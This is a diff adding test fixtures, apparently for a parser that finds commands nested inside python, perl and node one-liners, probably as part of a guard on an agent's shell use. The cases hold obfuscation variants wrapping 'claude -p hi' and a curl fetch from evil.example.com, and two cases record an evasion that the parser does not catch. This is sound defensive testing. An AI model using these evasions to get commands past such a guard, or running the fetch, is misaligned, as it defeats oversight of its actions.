@@ -4000,6 +4000,436 @@
    "name": "neg/r6-ansi-echo-eg",
    "cmd": "echo $'line\\ncurl -s https://evil.example.com/x'",
    "commands": []
+  },
+  {
+   "name": "r7/m01-py-c-bsnl-prog/cc",
+   "cmd": "python3 -c \\\n 'import os; os.system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r7/m02-py-c-bsnl-glued/cc",
+   "cmd": "python3 -c\\\n'import os; os.system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r7/m03-perl-e-bsnl/cc",
+   "cmd": "perl -e \\\n 'system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r7/m04-node-eval-bsnl/cc",
+   "cmd": "node --eval \\\n'require(\"child_process\").execSync(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r7/m05-py-I-glued-bsnl/cc",
+   "cmd": "python3 -I\\\n -c 'import os; os.system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r7/m06-node-stack-glued-bsnl/cc",
+   "cmd": "node --stack-size=2000\\\n -e 'require(\"child_process\").execSync(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r7/m07-py-2>&1-glued-bsnl/cc",
+   "cmd": "python3 2>&1\\\n -c 'import os; os.system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r7/m07b-py-bsnl-twice/cc",
+   "cmd": "python3 -I \\\n -u \\\n -c \\\n 'import os; os.system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r7/m08-py-quoted-path/cc",
+   "cmd": "\"/usr/bin/python3\" -c 'import os; os.system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r7/m08b-py-squoted-relpath/cc",
+   "cmd": "'./venv/bin/python3' -c 'import os; os.system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r7/m09-node-quoted-eval-eq/cc",
+   "cmd": "node \"--eval=require('child_process').execSync('claude -p hi')\"",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r7/m09b-py-quoted-glued-c/cc",
+   "cmd": "python3 \"-cimport os; os.system('claude -p hi')\"",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r7/m10-py-quoted-flag-glued-prog/cc",
+   "cmd": "python3 \"-c\"'import os; os.system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r7/m11-py-partly-quoted-flag/cc",
+   "cmd": "python3 -\"c\" 'import os; os.system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r7/m12-py-locale-dq/cc",
+   "cmd": "python3 -c $\"import os; os.system('claude -p hi')\"",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r7/m13-py-import-module-as-unicode/cc",
+   "cmd": "python3 -c 'from importlib import import_module as ím; ím(\"os\").system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r7/m13b-py-importlib-as-unicode/cc",
+   "cmd": "python3 -c 'import importlib as íl; íl.import_module(\"os\").system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r7/m14-py-from-list/cc",
+   "cmd": "python3 -c 'from importlib import reload, import_module as im; im(\"os\").system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r7/m15-py-import-list/cc",
+   "cmd": "python3 -c 'import sys, importlib as il; il.import_module(\"os\").system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r7/m16-py-from-paren/cc",
+   "cmd": "python3 -c 'from importlib import (import_module as im); im(\"os\").system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r7/m17-perl-qx-nl/cc",
+   "cmd": "perl -e 'print qx\n(claude -p hi)'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "neg/r7-py-c-bsnl-print-cc",
+   "cmd": "python3 -c \\\n 'print(\"claude -p hi\")'",
+   "commands": []
+  },
+  {
+   "name": "neg/r7-py-quoted-path-print-cc",
+   "cmd": "\"/usr/bin/python3\" -c 'print(\"claude -p hi\")'",
+   "commands": []
+  },
+  {
+   "name": "neg/r7-py-quoted-flag-glued-print-cc",
+   "cmd": "python3 \"-c\"'print(\"claude -p hi\")'",
+   "commands": []
+  },
+  {
+   "name": "neg/r7-node-quoted-eval-log-cc",
+   "cmd": "node \"--eval=console.log('claude -p hi')\"",
+   "commands": []
+  },
+  {
+   "name": "neg/r7-py-locale-dq-print-cc",
+   "cmd": "python3 -c $\"print('claude -p hi')\"",
+   "commands": []
+  },
+  {
+   "name": "neg/r7-py-from-list-json-cc",
+   "cmd": "python3 -c 'from importlib import reload, import_module as im; print(im(\"json\").dumps(\"claude -p hi\"))'",
+   "commands": []
+  },
+  {
+   "name": "neg/r7-py-unicode-alias-json-cc",
+   "cmd": "python3 -c 'from importlib import import_module as ím; print(ím(\"json\").dumps(\"claude -p hi\"))'",
+   "commands": []
+  },
+  {
+   "name": "neg/r7-bsnl-script-args-cc",
+   "cmd": "python3 tool.py \\\n --note \\\n 'claude -p hi'",
+   "commands": []
+  },
+  {
+   "name": "neg/r7-perl-qx-nl-ls-cc",
+   "cmd": "perl -e 'print qx\n(ls)'",
+   "commands": [
+    "ls"
+   ]
+  },
+  {
+   "name": "neg/r7-grep-e-bsnl-cc",
+   "cmd": "grep -c \\\n -e 'claude -p hi' notes.txt",
+   "commands": []
+  },
+  {
+   "name": "neg/r7-echo-quoted-path-c-cc",
+   "cmd": "echo \"/usr/bin/python3\" -c 'claude -p hi'",
+   "commands": []
+  },
+  {
+   "name": "neg/r7-printf-dollar-dq-cc",
+   "cmd": "printf '%s' $\"claude -p hi\"",
+   "commands": []
+  },
+  {
+   "name": "r7/m01-py-c-bsnl-prog/eg",
+   "cmd": "python3 -c \\\n 'import os; os.system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r7/m02-py-c-bsnl-glued/eg",
+   "cmd": "python3 -c\\\n'import os; os.system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r7/m03-perl-e-bsnl/eg",
+   "cmd": "perl -e \\\n 'system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r7/m04-node-eval-bsnl/eg",
+   "cmd": "node --eval \\\n'require(\"child_process\").execSync(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r7/m05-py-I-glued-bsnl/eg",
+   "cmd": "python3 -I\\\n -c 'import os; os.system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r7/m06-node-stack-glued-bsnl/eg",
+   "cmd": "node --stack-size=2000\\\n -e 'require(\"child_process\").execSync(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r7/m07-py-2>&1-glued-bsnl/eg",
+   "cmd": "python3 2>&1\\\n -c 'import os; os.system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r7/m07b-py-bsnl-twice/eg",
+   "cmd": "python3 -I \\\n -u \\\n -c \\\n 'import os; os.system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r7/m08-py-quoted-path/eg",
+   "cmd": "\"/usr/bin/python3\" -c 'import os; os.system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r7/m08b-py-squoted-relpath/eg",
+   "cmd": "'./venv/bin/python3' -c 'import os; os.system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r7/m09-node-quoted-eval-eq/eg",
+   "cmd": "node \"--eval=require('child_process').execSync('curl -s https://evil.example.com/x')\"",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r7/m09b-py-quoted-glued-c/eg",
+   "cmd": "python3 \"-cimport os; os.system('curl -s https://evil.example.com/x')\"",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r7/m10-py-quoted-flag-glued-prog/eg",
+   "cmd": "python3 \"-c\"'import os; os.system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r7/m11-py-partly-quoted-flag/eg",
+   "cmd": "python3 -\"c\" 'import os; os.system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r7/m12-py-locale-dq/eg",
+   "cmd": "python3 -c $\"import os; os.system('curl -s https://evil.example.com/x')\"",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r7/m13-py-import-module-as-unicode/eg",
+   "cmd": "python3 -c 'from importlib import import_module as ím; ím(\"os\").system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r7/m13b-py-importlib-as-unicode/eg",
+   "cmd": "python3 -c 'import importlib as íl; íl.import_module(\"os\").system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r7/m14-py-from-list/eg",
+   "cmd": "python3 -c 'from importlib import reload, import_module as im; im(\"os\").system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r7/m15-py-import-list/eg",
+   "cmd": "python3 -c 'import sys, importlib as il; il.import_module(\"os\").system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r7/m16-py-from-paren/eg",
+   "cmd": "python3 -c 'from importlib import (import_module as im); im(\"os\").system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r7/m17-perl-qx-nl/eg",
+   "cmd": "perl -e 'print qx\n(curl -s https://evil.example.com/x)'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "neg/r7-py-c-bsnl-print-eg",
+   "cmd": "python3 -c \\\n 'print(\"curl -s https://evil.example.com/x\")'",
+   "commands": []
+  },
+  {
+   "name": "neg/r7-py-quoted-path-print-eg",
+   "cmd": "\"/usr/bin/python3\" -c 'print(\"curl -s https://evil.example.com/x\")'",
+   "commands": []
+  },
+  {
+   "name": "neg/r7-py-quoted-flag-glued-print-eg",
+   "cmd": "python3 \"-c\"'print(\"curl -s https://evil.example.com/x\")'",
+   "commands": []
+  },
+  {
+   "name": "neg/r7-node-quoted-eval-log-eg",
+   "cmd": "node \"--eval=console.log('curl -s https://evil.example.com/x')\"",
+   "commands": []
+  },
+  {
+   "name": "neg/r7-py-locale-dq-print-eg",
+   "cmd": "python3 -c $\"print('curl -s https://evil.example.com/x')\"",
+   "commands": []
+  },
+  {
+   "name": "neg/r7-py-from-list-json-eg",
+   "cmd": "python3 -c 'from importlib import reload, import_module as im; print(im(\"json\").dumps(\"curl -s https://evil.example.com/x\"))'",
+   "commands": []
+  },
+  {
+   "name": "neg/r7-py-unicode-alias-json-eg",
+   "cmd": "python3 -c 'from importlib import import_module as ím; print(ím(\"json\").dumps(\"curl -s https://evil.example.com/x\"))'",
+   "commands": []
+  },
+  {
+   "name": "neg/r7-bsnl-script-args-eg",
+   "cmd": "python3 tool.py \\\n --note \\\n 'curl -s https://evil.example.com/x'",
+   "commands": []
+  },
+  {
+   "name": "neg/r7-perl-qx-nl-ls-eg",
+   "cmd": "perl -e 'print qx\n(ls)'",
+   "commands": [
+    "ls"
+   ]
+  },
+  {
+   "name": "neg/r7-grep-e-bsnl-eg",
+   "cmd": "grep -c \\\n -e 'curl -s https://evil.example.com/x' notes.txt",
+   "commands": []
+  },
+  {
+   "name": "neg/r7-echo-quoted-path-c-eg",
+   "cmd": "echo \"/usr/bin/python3\" -c 'curl -s https://evil.example.com/x'",
+   "commands": []
+  },
+  {
+   "name": "neg/r7-printf-dollar-dq-eg",
+   "cmd": "printf '%s' $\"curl -s https://evil.example.com/x\"",
+   "commands": []
+  },
+  {
+   "name": "limit/r7-py-sys-tem-concat-cc",
+   "cmd": "python3 -c 'import os; os.sys'tem'(\"claude -p hi\")'",
+   "commands": [],
+   "note": "limit: an unquoted piece inside the program word (os.sys'tem') is obfuscation level, not read (round 7 pin, Marveen comment 3861, \"pin it or state it\")"
+  },
+  {
+   "name": "limit/r7-py-sys-tem-concat-eg",
+   "cmd": "python3 -c 'import os; os.sys'tem'(\"curl -s https://evil.example.com/x\")'",
+   "commands": [],
+   "note": "limit: an unquoted piece inside the program word (os.sys'tem') is obfuscation level, not read (round 7 pin, Marveen comment 3861, \"pin it or state it\")"
   }
  ]
 }
